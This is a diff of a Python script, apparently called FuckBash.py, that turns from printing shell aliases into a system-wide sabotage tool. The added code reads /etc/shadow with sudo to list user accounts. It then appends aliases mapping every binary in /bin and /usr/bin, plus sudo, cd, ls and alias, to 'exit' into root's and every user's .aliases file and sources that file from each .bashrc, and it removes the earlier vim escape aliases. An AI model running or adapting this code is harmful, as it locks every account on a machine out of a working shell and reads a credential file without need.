@@ -1,28 +1,27 @@
 #!/usr/bin/env python
 
-#Currently run this to make this work.
-#FuckBash.py >> /home/$USER/.bashrc
-
 import subprocess
+import os
 
+users = []
 
-aliasesProcess = subprocess.Popen("{ ls /bin; ls /usr/bin; } | sort", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-for line in aliasesProcess.stdout.readlines():
-	if line.rstrip('\n') == "vi":
-		print ""
-	elif line.rstrip('\n') == "vim":
-		print ""
-	else:
-		print "alias " + line.rstrip('\n') + "=\'exit\'"
+namesProcess = subprocess.Popen("sudo awk -F':' '$2 ~ \"\$\" {print $1}' /etc/shadow", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+for line in namesProcess.stdout.readlines():
+	users.append(line.rstrip('\n'))
 
-nameProcess = subprocess.Popen("echo $USER", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-name = nameProcess.stdout.readline()
+def appendAliases(aliasesfolder):
+	with open(aliasesfolder, "a") as myfile:
+		aliasesProcess = subprocess.Popen("{ ls /bin; ls /usr/bin; } | sort", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+		for line in aliasesProcess.stdout.readlines():
+			myfile.write("alias " + line.rstrip('\n') + "=\'exit\'\n")
+		myfile.write("alias sudo='exit'\n")
+		myfile.write("alias cd='exit'\n")
+		myfile.write("alias ls='exit'\n")
+		myfile.write("alias alias='exit'\n")
 
-print "alias plzfix='vim /home/" + name.rstrip('\n') + "/.bashrc'"
-print "alias plzfixthis='vi /home/" + name.rstrip('\n') + "/.bashrc'"
-print "alias sudo='exit'"
-print "alias cd='exit'"
-print "alias ls='exit'"
-print "alias alias='exit'"
+appendAliases("/root/.aliases")
+os.system("echo source /root/.aliases >> /root/.bashrc")
 
-
+for user in users:
+	appendAliases("/home/" + user + "/.aliases")
+	os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
